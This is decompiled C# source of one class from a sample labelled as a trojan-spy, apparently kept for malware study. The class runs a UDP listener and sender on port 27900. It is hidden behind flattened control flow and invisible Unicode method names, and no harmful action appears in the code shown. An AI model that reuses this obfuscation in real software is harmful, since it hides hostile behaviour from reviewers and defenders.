// Decompiled with JetBrains decompiler
// Type: NumberListCodes.TraceLoggingDataType
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

using EnvironmentPermissionAccess;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace NumberListCodes
{
  public class TraceLoggingDataType
  {
    private Thread listenThread;
    private UdpClient listener;
    private bool running;

    public IPAddress Address { get; set; }

    public int Port { get; set; }

    public REDocument Server { get; set; }

    public event TraceLoggingDataType.BindFailedEventHandler BindFailed
    {
      add
      {
        TraceLoggingDataType.BindFailedEventHandler failedEventHandler1 = this.BindFailedEvent;
label_1:
        int num1 = -1026282493;
        TraceLoggingDataType.BindFailedEventHandler comparand;
        TraceLoggingDataType.BindFailedEventHandler failedEventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1744526931)) % 6U)
          {
            case 0:
              failedEventHandler1 = Interlocked.CompareExchange<TraceLoggingDataType.BindFailedEventHandler>(ref this.BindFailedEvent, failedEventHandler2, comparand);
              num1 = (int) num2 * -1950231621 ^ -1638767669;
              continue;
            case 1:
              failedEventHandler2 = (TraceLoggingDataType.BindFailedEventHandler) TraceLoggingDataType.\u206A‭‫⁪‬‬⁬‫‍⁮‏‭‌‌‎​‌‪⁪‍‮‮‍‎⁪​‬⁪‫⁪‍⁮‌⁯‪⁮‮‬⁮‏‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -1805749652 ^ 1270489889;
              continue;
            case 2:
              int num3 = failedEventHandler1 != comparand ? -1460652167 : (num3 = -1070128248);
              num1 = num3 ^ (int) num2 * 810181763;
              continue;
            case 3:
              goto label_3;
            case 4:
              comparand = failedEventHandler1;
              num1 = -1408829394;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      remove
      {
        TraceLoggingDataType.BindFailedEventHandler failedEventHandler = this.BindFailedEvent;
label_1:
        int num1 = 2017961876;
        TraceLoggingDataType.BindFailedEventHandler comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 638463474)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = failedEventHandler == comparand ? -1351286103 : (num3 = -569706357);
              num1 = num3 ^ (int) num2 * 8735147;
              continue;
            case 2:
              comparand = failedEventHandler;
              failedEventHandler = Interlocked.CompareExchange<TraceLoggingDataType.BindFailedEventHandler>(ref this.BindFailedEvent, (TraceLoggingDataType.BindFailedEventHandler) TraceLoggingDataType.\u202A⁬‪‎‍‌⁮‫‏‎‬⁪⁭⁫‭‭‌‮‭‭⁮‌‪⁪⁪⁬⁮⁭​‮‬⁪⁬⁯⁬⁭⁪‮‮⁪‮((Delegate) comparand, (Delegate) value), comparand);
              num1 = 950991279;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public TraceLoggingDataType(REDocument server)
    {
label_1:
      int num1 = 224265122;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1537922402)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Server = server;
            num1 = (int) num2 * 1489377426 ^ -467917619;
            continue;
          case 2:
            num1 = (int) num2 * -1532593808 ^ -1169550314;
            continue;
          case 3:
            num1 = (int) num2 * -1274846338 ^ 1502552939;
            continue;
          case 4:
            this.Port = 27900;
            num1 = (int) num2 * -399195999 ^ 2006194268;
            continue;
          case 5:
            num1 = (int) num2 * -2063372591 ^ 415291730;
            continue;
          case 6:
            goto label_3;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    public void Open()
    {
      if (this.running)
        return;
      try
      {
        this.listener = TraceLoggingDataType.\u202E‬‫‌⁯‏‬⁯‎‎​‍⁫⁫⁫‪⁮‮​⁮​‭⁭‎‏‌‎‪⁭‮‌⁬‪‎‏‭‮‎⁬‬‮(TraceLoggingDataType.\u202B‌‪‏‏​‭​‫‪⁫‭‭⁬⁭‍‪‏⁯‍‌‍⁪​‫‏‭⁭​‌‎⁪⁭‫⁪⁬⁮⁫‎‬‮(this.Address, this.Port));
      }
      catch (Exception ex1)
      {
        TraceLoggingDataType.\u202C⁮⁯‍⁪‮⁬‎‪‮‌‬‌⁮⁮‪‍⁬⁫‮‎⁯⁪‎⁮⁫⁯‌‌⁬‬‮‭‎⁭⁯⁬‏⁯⁬‮(ex1);
        Exception ex2 = ex1;
label_3:
        int num1 = 1154964820;
        TraceLoggingDataType.BindFailedEventHandler bindFailedEvent;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 549372254)) % 7U)
          {
            case 0:
              goto label_3;
            case 2:
              int num3 = bindFailedEvent == null ? 1222464673 : (num3 = 2022561267);
              num1 = num3 ^ (int) num2 * -1657391358;
              continue;
            case 3:
              TraceLoggingDataType.\u206B‭⁯‎‪‎⁮⁪⁫‪‎⁪‎‬‮⁭‪⁪⁯⁪⁯⁮‭⁯‪⁭⁬‍⁭‍‭‮‪⁬⁭⁬⁫‮⁮⁮‮();
              num1 = 779290667;
              continue;
            case 4:
              // ISSUE: reference to a compiler-generated field
              bindFailedEvent = this.BindFailedEvent;
              num1 = (int) num2 * 226175350 ^ 645731352;
              continue;
            case 5:
              bindFailedEvent(this, ex2);
              num1 = (int) num2 * 2006022570 ^ -1189873449;
              continue;
            case 6:
              MemberFilter.Buffer.Log(TraceLoggingDataType.\u202A​‏‎⁭‪⁭⁬‭‎‭⁯‭⁬⁮‫⁫‌‎‍‍‮‎‭‬⁭⁬‭⁬‫‪⁬​‬⁯⁮⁮⁭⁮⁫‮(new string[5]
              {
                OffsetAndRule.ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(679664999U),
                TraceLoggingDataType.\u202E‪‌‍‍‭⁬⁫⁮‏‭⁬‬⁯⁬‏⁫‬‭‫⁬⁭⁯‪‌‏⁫⁬‌⁪‫⁪⁪‏‍‫‏⁪‫‌‮(this.Address),
                OffsetAndRule.ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(1688495337U),
                TraceLoggingDataType.\u200C‍‬‫⁮⁭⁫‏‪‬⁮‏‪⁫⁬⁫⁪​‮‮⁬‌‬‌‬‫‭‮⁫⁪⁮‎‮⁮‭​‪⁫⁮⁬‮(this.Port),
                OffsetAndRule.ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(4165887515U)
              }), (byte) 4);
              num1 = (int) num2 * 628108728 ^ 551083114;
              continue;
            default:
              goto label_12;
          }
        }
      }
label_12:
      this.running = true;
label_13:
      int num4 = 26929922;
      while (true)
      {
        uint num5;
        switch ((num5 = (uint) (num4 ^ 549372254)) % 6U)
        {
          case 0:
            goto label_11;
          case 1:
            num4 = (int) num5 * 1460888588 ^ 160074;
            continue;
          case 2:
            this.listenThread = TraceLoggingDataType.\u202B‍⁯⁬‬‎‭‏⁮⁬⁭‌‍​⁮⁪‍⁬⁯⁬⁭‏​‮⁮‮⁯⁬⁪​⁪‪‮⁯⁫⁫​⁬⁮⁯‮(new ThreadStart(this.Listen));
            num4 = (int) num5 * -1080666197 ^ -880951228;
            continue;
          case 3:
            goto label_13;
          case 4:
            TraceLoggingDataType.\u206B⁬​‍‎‫⁫⁪⁮⁭‌⁭‫⁫⁫‫‬‬‮⁯⁫‏‎‮‏⁯‮‫⁬‍‬‌‎‍⁫​⁯‭‮⁯‮(this.listenThread);
            num4 = (int) num5 * 897178598 ^ 48123309;
            continue;
          case 5:
            MemberFilter.Buffer.Log(TraceLoggingDataType.\u202A​‏‎⁭‪⁭⁬‭‎‭⁯‭⁬⁮‫⁫‌‎‍‍‮‎‭‬⁭⁬‭⁬‫‪⁬​‬⁯⁮⁮⁭⁮⁫‮(new string[5]
            {
              OffsetAndRule.ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(2122019064U),
              TraceLoggingDataType.\u202E‪‌‍‍‭⁬⁫⁮‏‭⁬‬⁯⁬‏⁫‬‭‫⁬⁭⁯‪‌‏⁫⁬‌⁪‫⁪⁪‏‍‫‏⁪‫‌‮(this.Address),
              OffsetAndRule.ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(1688495337U),
              TraceLoggingDataType.\u200C‍‬‫⁮⁭⁫‏‪‬⁮‏‪⁫⁬⁫⁪​‮‮⁬‌‬‌‬‫‭‮⁫⁪⁮‎‮⁮‭​‪⁫⁮⁬‮(this.Port),
              OffsetAndRule.ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(1154145354U)
            }), (byte) 2);
            num4 = (int) num5 * 1511826460 ^ 1099412157;
            continue;
          default:
            goto label_5;
        }
      }
label_11:
      return;
label_5:;
    }

    public void Close()
    {
label_1:
      int num1 = -33812793;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -945750375)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 144282284 ^ 1689901368;
            continue;
          case 2:
            this.running = false;
            num1 = (int) num2 * 725748310 ^ -222754496;
            continue;
          case 3:
            TraceLoggingDataType.\u206A⁬⁮⁫⁪⁫⁭‍‏⁮‭‬‍⁯⁮‪⁬‮‎‭⁪‭​⁯‎⁬‮‏⁮⁫‎‬​‬‌‫‌​‫‎‮(this.listener);
            num1 = (int) num2 * -1347049779 ^ 1565673623;
            continue;
          case 4:
            int num3 = !this.running ? 1841140634 : (num3 = 714293661);
            num1 = num3 ^ (int) num2 * 1533959733;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void Listen()
    {
label_1:
      uint num1;
      int num2;
      switch ((num1 = (uint) (1564506722 ^ 1982606847)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
label_22:
          if (!this.running)
          {
            num2 = 532787102;
            goto label_20;
          }
          else
            goto default;
        default:
          try
          {
label_4:
            int num3 = 1380458553;
            IPEndPoint rIPEP;
            byte[] data;
            bool flag;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) (num3 ^ 1982606847)) % 6U)
              {
                case 1:
                  num3 = (int) num4 * 848607210 ^ -1617215513;
                  continue;
                case 2:
                  rIPEP = (IPEndPoint) null;
                  data = TraceLoggingDataType.\u200E‏‪‪⁯‪‏‫⁯‌‌‫⁮‫‪‬⁭‬‎⁫‎‪‍⁯‭‍‭⁫⁫‮‍⁬‍⁭‍​‬‮‬‌‮(this.listener, ref rIPEP);
                  flag = data.Length > 0;
                  num3 = (int) num4 * 954762712 ^ 732253288;
                  continue;
                case 3:
                  int num5 = flag ? -657758070 : (num5 = -176845902);
                  num3 = num5 ^ (int) num4 * 1409408581;
                  continue;
                case 4:
                  this.OnDataInput(data, rIPEP);
                  num3 = (int) num4 * 1290631577 ^ 599387926;
                  continue;
                case 5:
                  goto label_4;
                default:
                  goto label_18;
              }
            }
          }
          catch (Exception ex)
          {
            TraceLoggingDataType.\u202C⁮⁯‍⁪‮⁬‎‪‮‌‬‌⁮⁮‪‍⁬⁫‮‎⁯⁪‎⁮⁫⁯‌‌⁬‬‮‭‎⁭⁯⁬‏⁯⁬‮(ex);
            Exception exception = ex;
label_11:
            int num6 = 723434346;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (num6 ^ 1982606847)) % 6U)
              {
                case 1:
                  num6 = (int) num7 * 1495457192 ^ -1550619627;
                  continue;
                case 2:
                  MemberFilter.Buffer.Log(TraceLoggingDataType.\u206C‌‪⁪‫‏​⁭⁫‏‎‫⁬‏⁬⁭⁯⁫⁪⁮⁫⁬⁭⁭⁬‌‬‍‪​‬‫‪‌‬‏‭⁮⁮‪‮(exception), (byte) 1);
                  num6 = (int) num7 * 288846238 ^ 687982986;
                  continue;
                case 3:
                  num6 = (int) num7 * 1929462412 ^ -719202032;
                  continue;
                case 4:
                  goto label_11;
                case 5:
                  TraceLoggingDataType.\u206B‭⁯‎‪‎⁮⁪⁫‪‎⁪‎‬‮⁭‪⁪⁯⁪⁯⁮‭⁯‪⁭⁬‍⁭‍‭‮‪⁬⁭⁬⁫‮⁮⁮‮();
                  num6 = (int) num7 * 670355299 ^ 293336976;
                  continue;
                default:
                  goto label_18;
              }
            }
          }
label_18:
          break;
      }
label_19:
      num2 = 839592272;
label_20:
      while (true)
      {
        uint num8;
        switch ((num8 = (uint) (num2 ^ 1982606847)) % 6U)
        {
          case 0:
            goto label_19;
          case 1:
            TraceLoggingDataType.\u200D⁯‎‬‏⁮‎‭​‏⁬‮‬⁭⁬‏⁪‎⁯‫‮‏‎⁫⁯‬⁫‮⁭⁬‍⁯‍⁭⁭‫‬‫‮‎‮(10);
            num2 = (int) num8 * 1729810563 ^ 1151498516;
            continue;
          case 2:
            num2 = (int) num8 * 1334636166 ^ 1852906609;
            continue;
          case 3:
            goto label_22;
          case 4:
            num2 = (int) num8 * -936845238 ^ -661655998;
            continue;
          case 5:
            goto label_21;
          default:
            goto label_17;
        }
      }
label_21:
      return;
label_17:;
    }

    internal virtual void OnDataInput(byte[] data, IPEndPoint rIPEP)
    {
    }

    public void send(byte[] data, IPEndPoint rIPEP)
    {
      UdpClient udpClient = TraceLoggingDataType.\u206B⁯‫‍⁭⁫⁫⁭⁫⁭⁪‍‮⁫⁫‎‎‌‌⁯‭​⁫‍‍‭⁪⁫‎‎‮⁯⁮⁮‭‏‍‭‫‫‮();
      try
      {
        TraceLoggingDataType.\u202C‬⁫‪‬‭⁭‫⁭‫⁪⁯‏⁫⁮‌‫⁭‍‎‏‪⁬⁬‭‌‌⁭⁭‎‮⁭‭‫‫⁯‬⁪⁬‍‮(this.listener, data, data.Length, rIPEP);
      }
      catch (Exception ex)
      {
        TraceLoggingDataType.\u202C⁮⁯‍⁪‮⁬‎‪‮‌‬‌⁮⁮‪‍⁬⁫‮‎⁯⁪‎⁮⁫⁯‌‌⁬‬‮‭‎⁭⁯⁬‏⁯⁬‮(ex);
label_3:
        int num1 = 5790742;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 866927052)) % 3U)
          {
            case 0:
              goto label_3;
            case 2:
              MemberFilter.Buffer.Log(TraceLoggingDataType.\u206C​‫⁮‫⁪‏‍‍⁯‪⁪⁯‮‎⁭⁬‎⁪⁫⁪‮‍‎‏​⁪‏‪⁬⁫‮‫‪‌⁭‪‎⁬⁭‮(OffsetAndRule.ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(2486004704U), TraceLoggingDataType.\u202E‪‌‍‍‭⁬⁫⁮‏‭⁬‬⁯⁬‏⁫‬‭‫⁬⁭⁯‪‌‏⁫⁬‌⁪‫⁪⁪‏‍‫‏⁪‫‌‮(TraceLoggingDataType.\u206C​‭‍‏⁪⁪⁭⁯‏‪‮⁯‎⁪⁪‪⁪⁯‎‮​‮‮‭‏‏‎‫‫​‏⁬‫⁬‪⁯‌⁬⁭‮(rIPEP))), (byte) 3);
              TraceLoggingDataType.\u206B‭⁯‎‪‎⁮⁪⁫‪‎⁪‎‬‮⁭‪⁪⁯⁪⁯⁮‭⁯‪⁭⁬‍⁭‍‭‮‪⁬⁭⁬⁫‮⁮⁮‮();
              num1 = (int) num2 * 1506859934 ^ -355704226;
              continue;
            default:
              goto label_6;
          }
        }
      }
label_6:
      udpClient = (UdpClient) null;
    }

    static Delegate \u206A‭‫⁪‬‬⁬‫‍⁮‏‭‌‌‎​‌‪⁪‍‮‮‍‎⁪​‬⁪‫⁪‍⁮‌⁯‪⁮‮‬⁮‏‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u202A⁬‪‎‍‌⁮‫‏‎‬⁪⁭⁫‭‭‌‮‭‭⁮‌‪⁪⁪⁬⁮⁭​‮‬⁪⁬⁯⁬⁭⁪‮‮⁪‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static IPEndPoint \u202B‌‪‏‏​‭​‫‪⁫‭‭⁬⁭‍‪‏⁯‍‌‍⁪​‫‏‭⁭​‌‎⁪⁭‫⁪⁬⁮⁫‎‬‮(
      [In] IPAddress obj0,
      [In] int obj1)
    {
      return new IPEndPoint(obj0, obj1);
    }

    static UdpClient \u202E‬‫‌⁯‏‬⁯‎‎​‍⁫⁫⁫‪⁮‮​⁮​‭⁭‎‏‌‎‪⁭‮‌⁬‪‎‏‭‮‎⁬‬‮([In] IPEndPoint obj0) => new UdpClient(obj0);

    static void \u202C⁮⁯‍⁪‮⁬‎‪‮‌‬‌⁮⁮‪‍⁬⁫‮‎⁯⁪‎⁮⁫⁯‌‌⁬‬‮‭‎⁭⁯⁬‏⁯⁬‮([In] Exception obj0) => ProjectData.SetProjectError(obj0);

    static string \u202E‪‌‍‍‭⁬⁫⁮‏‭⁬‬⁯⁬‏⁫‬‭‫⁬⁭⁯‪‌‏⁫⁬‌⁪‫⁪⁪‏‍‫‏⁪‫‌‮([In] IPAddress obj0) => obj0.ToString();

    static string \u200C‍‬‫⁮⁭⁫‏‪‬⁮‏‪⁫⁬⁫⁪​‮‮⁬‌‬‌‬‫‭‮⁫⁪⁮‎‮⁮‭​‪⁫⁮⁬‮([In] int obj0) => Conversions.ToString(obj0);

    static string \u202A​‏‎⁭‪⁭⁬‭‎‭⁯‭⁬⁮‫⁫‌‎‍‍‮‎‭‬⁭⁬‭⁬‫‪⁬​‬⁯⁮⁮⁭⁮⁫‮([In] string[] obj0) => string.Concat(obj0);

    static void \u206B‭⁯‎‪‎⁮⁪⁫‪‎⁪‎‬‮⁭‪⁪⁯⁪⁯⁮‭⁯‪⁭⁬‍⁭‍‭‮‪⁬⁭⁬⁫‮⁮⁮‮() => ProjectData.ClearProjectError();

    static Thread \u202B‍⁯⁬‬‎‭‏⁮⁬⁭‌‍​⁮⁪‍⁬⁯⁬⁭‏​‮⁮‮⁯⁬⁪​⁪‪‮⁯⁫⁫​⁬⁮⁯‮([In] ThreadStart obj0) => new Thread(obj0);

    static void \u206B⁬​‍‎‫⁫⁪⁮⁭‌⁭‫⁫⁫‫‬‬‮⁯⁫‏‎‮‏⁯‮‫⁬‍‬‌‎‍⁫​⁯‭‮⁯‮([In] Thread obj0) => obj0.Start();

    static void \u206A⁬⁮⁫⁪⁫⁭‍‏⁮‭‬‍⁯⁮‪⁬‮‎‭⁪‭​⁯‎⁬‮‏⁮⁫‎‬​‬‌‫‌​‫‎‮([In] UdpClient obj0) => obj0.Close();

    static byte[] \u200E‏‪‪⁯‪‏‫⁯‌‌‫⁮‫‪‬⁭‬‎⁫‎‪‍⁯‭‍‭⁫⁫‮‍⁬‍⁭‍​‬‮‬‌‮(
      [In] UdpClient obj0,
      [In] ref IPEndPoint obj1)
    {
      return obj0.Receive(ref obj1);
    }

    static string \u206C‌‪⁪‫‏​⁭⁫‏‎‫⁬‏⁬⁭⁯⁫⁪⁮⁫⁬⁭⁭⁬‌‬‍‪​‬‫‪‌‬‏‭⁮⁮‪‮([In] Exception obj0) => obj0.ToString();

    static void \u200D⁯‎‬‏⁮‎‭​‏⁬‮‬⁭⁬‏⁪‎⁯‫‮‏‎⁫⁯‬⁫‮⁭⁬‍⁯‍⁭⁭‫‬‫‮‎‮([In] int obj0) => Thread.Sleep(obj0);

    static UdpClient \u206B⁯‫‍⁭⁫⁫⁭⁫⁭⁪‍‮⁫⁫‎‎‌‌⁯‭​⁫‍‍‭⁪⁫‎‎‮⁯⁮⁮‭‏‍‭‫‫‮() => new UdpClient();

    static int \u202C‬⁫‪‬‭⁭‫⁭‫⁪⁯‏⁫⁮‌‫⁭‍‎‏‪⁬⁬‭‌‌⁭⁭‎‮⁭‭‫‫⁯‬⁪⁬‍‮(
      [In] UdpClient obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] IPEndPoint obj3)
    {
      return obj0.Send(obj1, obj2, obj3);
    }

    static IPAddress \u206C​‭‍‏⁪⁪⁭⁯‏‪‮⁯‎⁪⁪‪⁪⁯‎‮​‮‮‭‏‏‎‫‫​‏⁬‫⁬‪⁯‌⁬⁭‮([In] IPEndPoint obj0) => obj0.Address;

    static string \u206C​‫⁮‫⁪‏‍‍⁯‪⁪⁯‮‎⁭⁬‎⁪⁫⁪‮‍‎‏​⁪‏‪⁬⁫‮‫‪‌⁭‪‎⁬⁭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    public delegate void BindFailedEventHandler(TraceLoggingDataType sender, Exception ex);
  }
}
